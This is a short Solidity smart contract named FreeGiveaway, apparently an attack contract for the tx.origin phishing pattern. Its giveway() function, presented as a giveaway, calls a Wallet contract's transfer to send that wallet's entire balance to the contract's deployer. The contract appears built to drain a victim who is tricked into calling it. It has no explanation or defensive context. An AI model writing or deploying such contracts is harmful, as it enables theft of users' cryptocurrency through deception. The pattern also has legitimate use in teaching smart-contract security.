contract FreeGiveaway {

    Wallet wallet;

    address payable owner;

    constructor(address payable addr) {

        wallet = Wallet(addr);
        owner = payable(msg.sender);

    }

    function giveway() public {

        wallet.transfer(owner, address(wallet).balance);

    }

}